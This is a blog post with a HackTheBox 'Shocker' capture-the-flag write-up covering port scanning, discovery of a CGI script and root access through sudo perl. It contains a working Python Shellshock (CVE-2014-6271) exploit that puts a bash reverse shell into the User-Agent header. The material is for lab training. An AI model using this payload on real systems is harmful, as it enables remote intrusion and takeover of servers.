<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>HackTheBox - Shocker Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HackTheBox - Shocker Writeup" />
<meta property="og:description" content="Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports.
1 2 3 4 5 6 7 8 9 10 11 12 nmap -p80,2222 -sCV -oN nmap/shocker 10.10.10.56 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh OpenSSH 7." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://shafiqaiman.com/posts/htb/shocker/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/shocker/featured.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-05T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-11-05T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/shocker/featured.png"/>
<meta name="twitter:title" content="HackTheBox - Shocker Writeup"/>
<meta name="twitter:description" content="Nmap Like always, I’m going to scan the IP Address by using nmap but I’m going to scan the full port first. Then, I’m going to scan the only open ports.
1 2 3 4 5 6 7 8 9 10 11 12 nmap -p80,2222 -sCV -oN nmap/shocker 10.10.10.56 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn&#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 2222/tcp open ssh OpenSSH 7."/>
<meta name="application-name" content="SHAFIQAIMAN">
<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/shocker/" /><link rel="prev" href="https://shafiqaiman.com/posts/htb/validation/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/valentine/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HackTheBox - Shocker Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/shocker\/"
        },"genre": "posts","keywords": "CVE-2014-6271, gobuster, shellshock, sudo-perl, GTFOBins, rce, python, file-misconfiguration, cgi-bin","wordcount":  743 ,
        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/shocker\/","datePublished": "2022-11-05T00:00:00+00:00","dateModified": "2022-11-05T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "SHAFIQAIMAN"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Shocker Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SHAFIQAIMAN</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="05-11-2022">05-11-2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;743 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#nmap">Nmap</a></li>
    <li><a href="#http-dont-bug-me">Http: don&rsquo;t bug me!</a>
      <ul>
        <li><a href="#gobuster">Gobuster</a></li>
        <li><a href="#http-cgi-binusersh">Http: /Cgi-Bin/User.sh</a></li>
      </ul>
    </li>
    <li><a href="#foothold-shellshock">Foothold: ShellShock</a></li>
    <li><a href="#privesc-perl">PrivEsc: Perl</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="nmap">Nmap</h2>
<p>Like always, I’m going to scan the IP Address by using <a href="https://nmap.org/" target="_blank" rel="noopener noreffer ">nmap</a> but I’m going to scan the full port first. Then, I’m going to scan the only open ports.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p80</span><span class="p">,</span><span class="mi">2222</span><span class="w"> </span><span class="o">-</span><span class="n">sCV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">shocker</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">56</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">18</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Site</span><span class="w"> </span><span class="n">doesn</span><span class="s1">&#39;t have a title (text/html).
</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Apache/2.4.18 (Ubuntu)
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class="line"><span class="cl"><span class="s1">| ssh-hostkey: 
</span></span></span><span class="line"><span class="cl"><span class="s1">|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
</span></span></span><span class="line"><span class="cl"><span class="s1">|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
</span></span></span><span class="line"><span class="cl"><span class="s1">|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
</span></span></span><span class="line"><span class="cl"><span class="s1">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The nmap scan result is completed. There are just <code>2</code> port opens which are port <code>80</code> and port <code>2222</code>. It&rsquo;s a bit odd to configure the <code>SSH</code> in another port besides the standard port <code>22</code>. However, based on the <a href="https://launchpad.net/ubuntu/&#43;source/openssh/1:7.2p2-4ubuntu2.2" target="_blank" rel="noopener noreffer ">OpenSSH</a> service banner, this is an Ubuntu (xenial) machine. Unfortunately, I can&rsquo;t do much with <code>SSH</code> since it&rsquo;s mostly secure hence the name <code>Secure Shell</code>. :)</p>
<h2 id="http-dont-bug-me">Http: don&rsquo;t bug me!</h2>
<p>With that information in hand. I&rsquo;ve navigated port <code>80</code> through my browser and I&rsquo;ve been greeted with this page. It&rsquo;s just a funny image with text that says <code>&quot;Don't Bug Me!&quot;</code>. Based on the <code>index</code> page extension, it&rsquo;s an <code>html</code> file.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/shocker/dont-bug-me.png"
        data-srcset="/posts/htb/shocker/dont-bug-me.png, /posts/htb/shocker/dont-bug-me.png 1.5x, /posts/htb/shocker/dont-bug-me.png 2x"
        data-sizes="auto"
        alt="/posts/htb/shocker/dont-bug-me.png"
        title="/posts/htb/shocker/dont-bug-me.png" width="732" height="456" /></p>
<h3 id="gobuster">Gobuster</h3>
<p>So, I&rsquo;m going to run <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreffer ">gobuster</a> to enumerate more on this webserver. However, it&rsquo;s just a massive dead end for me. I can&rsquo;t find anything at all. Based on this machine name, which is <code>shocker</code> and I&rsquo;m thinking somehow it&rsquo;s based on <a href="https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29" target="_blank" rel="noopener noreffer ">Shellshock</a> vulnerability. Also, it has an <code>Apache</code> web server running and this vulnerability can occur in the <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface" target="_blank" rel="noopener noreffer ">/cgi-bin/</a> directory. When I navigated to that directory in my browser, I instantly got <code>Forbidden</code> or <code>403</code> which means it existed.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/shocker/cgi-bin.png"
        data-srcset="/posts/htb/shocker/cgi-bin.png, /posts/htb/shocker/cgi-bin.png 1.5x, /posts/htb/shocker/cgi-bin.png 2x"
        data-sizes="auto"
        alt="/posts/htb/shocker/cgi-bin.png"
        title="/posts/htb/shocker/cgi-bin.png" width="647" height="321" /></p>
<p>Now, I&rsquo;m confused why <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreffer ">gobuster</a> can&rsquo;t find it at all, and based on the wordlist I used, the <code>cgi-bin</code> is present in it. With closer inspection, I found out that it needs to be another &ldquo;slash&rdquo; <code>/</code> in the end. For example <code>/cgi-bin</code> vs <code>/cgi-bin/</code>. When it doesn&rsquo;t have <code>/</code> at the end, it goes straight to <code>404 Not Found</code>. Then, I&rsquo;ll try running the <a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener noreffer ">gobuster</a> again with tag <code>-f</code> for <code>Append / to each request</code> and it did manage to find the <code>/cgi-bin/</code> directory.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/shocker/gobuster-cgi-bin.png"
        data-srcset="/posts/htb/shocker/gobuster-cgi-bin.png, /posts/htb/shocker/gobuster-cgi-bin.png 1.5x, /posts/htb/shocker/gobuster-cgi-bin.png 2x"
        data-sizes="auto"
        alt="/posts/htb/shocker/gobuster-cgi-bin.png"
        title="/posts/htb/shocker/gobuster-cgi-bin.png" width="1001" height="424" /></p>
<p>The best thing to do now is to enumerate more in that directory but this time I&rsquo;m using the <code>-x</code> flag for looking up the extension with <code>.sh</code> and <code>.cgi</code> and I&rsquo;ve got a hit with the <code>user.sh</code> file.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/shocker/gobuster-cgi-bin-user-sh.png"
        data-srcset="/posts/htb/shocker/gobuster-cgi-bin-user-sh.png, /posts/htb/shocker/gobuster-cgi-bin-user-sh.png 1.5x, /posts/htb/shocker/gobuster-cgi-bin-user-sh.png 2x"
        data-sizes="auto"
        alt="/posts/htb/shocker/gobuster-cgi-bin-user-sh.png"
        title="/posts/htb/shocker/gobuster-cgi-bin-user-sh.png" width="1032" height="394" /></p>
<h3 id="http-cgi-binusersh">Http: /Cgi-Bin/User.sh</h3>
<p>When I navigated to that file which is <code>user.sh</code> it automatically downloaded it into my machine. When I opened it up, it was <code>&quot;Just an uptime test script&quot;</code> and nothing too fancy about it. ;)</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/shocker/read-the-file-user-sh.png"
        data-srcset="/posts/htb/shocker/read-the-file-user-sh.png, /posts/htb/shocker/read-the-file-user-sh.png 1.5x, /posts/htb/shocker/read-the-file-user-sh.png 2x"
        data-sizes="auto"
        alt="/posts/htb/shocker/read-the-file-user-sh.png"
        title="/posts/htb/shocker/read-the-file-user-sh.png" width="637" height="259" /></p>
<h2 id="foothold-shellshock">Foothold: ShellShock</h2>
<p>So, I already have the file that I needed for the exploitation but I didn&rsquo;t know how to tinker with it. So, the same old me goes to my handsome and wise friend Mr.Google and asking about ShellShock&rsquo;s vulnerability. I ended up finding this <a href="https://www.sevenlayers.com/index.php/125-exploiting-shellshock" target="_blank" rel="noopener noreffer ">blog</a> post showcasing <code>&quot;how to exploit shellshock manually&quot;</code> also the given CVE for this vulnerability is <a href="https://nvd.nist.gov/vuln/detail/cve-2014-6271" target="_blank" rel="noopener noreffer ">CVE-2014-6271</a>. I can inject some arbitrary bash command in the <code>User-Agent</code> but with some weird string inside it. Luckily, I manage to find this <a href="https://unix.stackexchange.com/a/157520" target="_blank" rel="noopener noreffer ">answer</a> regard of that <code>string</code> (Kind of understand a bit) but I want to be &ldquo;leet&rdquo; today. So, I&rsquo;m going to make a <a href="https://www.python.org/" target="_blank" rel="noopener noreffer ">python</a> script to gain the initial foothold with <a href="https://www.revshells.com/" target="_blank" rel="noopener noreffer ">bash reverse shell</a>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--lhost&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;listening ip&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="s1">&#39;--lport&#39;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;listening port&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">lhost</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">lport</span><span class="si">}</span><span class="s2"> 0&gt;&amp;1&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.10.56/cgi-bin/user.sh&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">agent</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span><span class="s1">&#39;() { :; }; echo ; echo ; &#39;</span><span class="o">+</span> <span class="n">payload</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">agent</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">);</span><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>why not? ¯\(0_0)/¯</p>
<h2 id="privesc-perl">PrivEsc: Perl</h2>
<p>I&rsquo;m in as a <code>shelly</code> user and the very first thing I love to do is <a href="https://note.shafiqaiman.com/misc/upgrade-reverse-shell#python" target="_blank" rel="noopener noreffer ">upgrading my shell</a> with python since this machine has python installed on it. Like always, I love to start with the simple <code>&quot;check&quot;</code> in the sudo permission with the <code>sudo -l</code> command. Shockingly, I can run <code>perl</code> with the sudo command without any authentication needed. So, I&rsquo;m heading to the lovely <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreffer ">gtfobins</a> that have a bunch of collection of Unix binaries that can be abused. Then, I&rsquo;ll try to run it, and BOOM!</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/shocker/root.png"
        data-srcset="/posts/htb/shocker/root.png, /posts/htb/shocker/root.png 1.5x, /posts/htb/shocker/root.png 2x"
        data-sizes="auto"
        alt="/posts/htb/shocker/root.png"
        title="/posts/htb/shocker/root.png" width="858" height="330" /></p>
<p>VOILA</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 05-11-2022</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/shocker/" data-title="HackTheBox - Shocker Writeup" data-via="_shafiqaiman_" data-hashtags="CVE-2014-6271,gobuster,shellshock,sudo-perl,GTFOBins,rce,python,file-misconfiguration,cgi-bin"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/shocker/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/shocker/" data-title="HackTheBox - Shocker Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/shocker/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/cve-2014-6271/">CVE-2014-6271</a>,&nbsp;<a href="/tags/gobuster/">gobuster</a>,&nbsp;<a href="/tags/shellshock/">shellshock</a>,&nbsp;<a href="/tags/sudo-perl/">sudo-perl</a>,&nbsp;<a href="/tags/gtfobins/">GTFOBins</a>,&nbsp;<a href="/tags/rce/">rce</a>,&nbsp;<a href="/tags/python/">python</a>,&nbsp;<a href="/tags/file-misconfiguration/">file-misconfiguration</a>,&nbsp;<a href="/tags/cgi-bin/">cgi-bin</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/htb/validation/" class="prev" rel="prev" title="HackTheBox - Validation Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Validation Writeup</a>
            <a href="/posts/htb/valentine/" class="next" rel="next" title="HackTheBox - Valentine Writeup">HackTheBox - Valentine Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
